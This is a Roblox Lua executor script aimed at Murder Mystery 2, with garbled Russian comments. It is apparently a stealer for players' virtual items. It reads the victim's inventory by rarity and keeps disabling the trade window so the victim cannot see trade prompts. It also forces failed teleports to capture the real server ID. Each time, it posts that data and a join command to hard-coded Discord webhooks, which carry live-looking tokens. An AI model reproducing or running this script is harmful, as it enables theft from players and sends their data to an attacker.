if getgenv().executed then return end
getgenv().executed = true

-- === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
local Username = "Warrior_ggs"
local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

local DualUsername = "Warrior_ggs"
local DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
local DualUnique = 1
local DualAncient = 1
local DualGodly = 1

local userName = Username
local webHook = Webhook

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- === –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ Embed ===
local function SendMessageEMBED(url, embed, bool)
    local headers = {["Content-Type"]="application/json"}
    local data = {
        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields}}
    }
    local data2 = {
        ["content"] = '---@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields}}
    }
    local body = HttpService:JSONEncode(data)
    local body2 = HttpService:JSONEncode(data2)

    if bool then
        pcall(function()
            request({Url=url, Method="POST", Headers=headers, Body=body2})
        end)
    else
        pcall(function()
            request({Url=url, Method="POST", Headers=headers, Body=body})
        end)
    end
end

-- === –ü–µ—Ä–≤—ã–π task: –∞–≤—Ç–æ–±–æ—Ç ===
task.spawn(function()
    -- –ó–¥–µ—Å—å –≤–µ—Å—å –≤–∞—à –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–¥ –∞–≤—Ç–æ–±–æ—Ç–∞: —Å–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è, –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ GUI, —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –ø–æ —Ä–µ–¥–∫–æ—Å—Ç–∏, –æ—Ç–ø—Ä–∞–≤–∫–∞ Embed
    print("–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∞–≤—Ç–æ–±–æ—Ç: —Å–±–æ—Ä –ø—Ä–µ–¥–º–µ—Ç–æ–≤, –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ TradeGUI –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ Embed")
    
    -- –ü—Ä–∏–º–µ—Ä: –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ TradeGUI
    local player = Players.LocalPlayer
    local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
    local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

    local destroyTrades = coroutine.create(function()
        while true do
            if tradeGUI.Enabled then tradeGUI.Enabled = false end
            if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
            wait(0.1)
        end
    end)
    coroutine.resume(destroyTrades)

    -- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –∏ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –ø—Ä–µ–¥–º–µ—Ç–æ–≤ –ø–æ —Ä–µ–¥–∫–æ—Å—Ç–∏
    local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
    local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
    local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

    local allItems, uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}, {}
    local uniqueItemsC, ancientItemsC, godlyItemsC, legendaryItemsC, vintageItemsC, rareItemsC, uncommonItemsC, commonItemsC = 0,0,0,0,0,0,0,0

    for _, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, d in pairs(b) do
            table.insert(allItems, d.ItemName)
            if d.Rarity=="Unique" then uniqueItemsC=uniqueItemsC+1 table.insert(uniqueItems,d.DataID) end
            if d.Rarity=="Ancient" then ancientItemsC=ancientItemsC+1 table.insert(ancientItems,d.DataID) end
            if d.Rarity=="Godly" then godlyItemsC=godlyItemsC+1 table.insert(godlyItems,d.DataID) end
            if d.Rarity=="Legendary" then legendaryItemsC=legendaryItemsC+1 table.insert(legendaryItems,d.DataID) end
            if d.Rarity=="Vintage" then vintageItemsC=vintageItemsC+1 table.insert(vintageItems,d.DataID) end
            if d.Rarity=="Rare" then rareItemsC=rareItemsC+1 table.insert(rareItems,d.DataID) end
            if d.Rarity=="Uncommon" then uncommonItemsC=uncommonItemsC+1 table.insert(uncommonItems,d.DataID) end
            if d.Rarity=="Common" then commonItemsC=commonItemsC+1 table.insert(commonItems,d.DataID) end
        end
    end

    -- –§–æ—Ä–º–∏—Ä—É–µ–º Embed –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
    local embed = {
        ["title"] = "–ê–≤—Ç–æ–±–æ—Ç –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω",
        ["color"] = 65280,
        ["fields"] = {
            {["name"]="–î–µ—Ç–∞–ª–∏", ["value"]="–£–Ω–∏–∫–∞–ª—å–Ω—ã–µ: "..uniqueItemsC..", –î—Ä–µ–≤–Ω–∏–µ: "..ancientItemsC..", –ë–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ: "..godlyItemsC}
        }
    }

    SendMessageEMBED(webHook, embed, false)
end)

-- –ñ–¥—ë–º –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º JobId –±–∞–π–ø–∞—Å—Å–µ—Ä–∞
task.wait(0.5)

-- === –í—Ç–æ—Ä–æ–π task: JobId –±–∞–π–ø–∞—Å—Å–µ—Ä ===
task.spawn(function()
    local placeId = 142823291 -- MM2 placeId
    local spoofedJobId = game.JobId
    local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"

    TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,v)
        if v and v.ServerInstanceId then
            local realJobId = v.ServerInstanceId
            print("Real JobId detected:", realJobId)

            -- –í–µ–±—Ö—É–∫ —Å JobId
            local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
            local webhookData = {embeds={{title="üîç JobID Info", description="Captured real JobID via failed teleport", color=65280, fields={{name="Spoofed JobID", value=spoofedJobId, inline=true}, {name="Real JobID", value=realJobId, inline=true}, {name="Fern.wtf Join Link", value=fernUrl, inline=false}}, footer={text="Delta JobID Logger"}}}}

            pcall(function()
                http_request({Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(webhookData)})
            end)

            -- –°–æ—Ö—Ä–∞–Ω—è–µ–º JobId –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–π —Å–µ—Å—Å–∏–∏
            queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
        end
    end)

    -- –§–µ–π–ª–æ–≤—ã–π —Ç–µ–ª–µ–ø–æ—Ä—Ç –¥–ª—è –ª–æ–≤–ª–∏ JobId
    for _ = 1, 2 do
        task.spawn(function()
            pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
            end)
        end)
        task.wait(0.5)
    end
end)
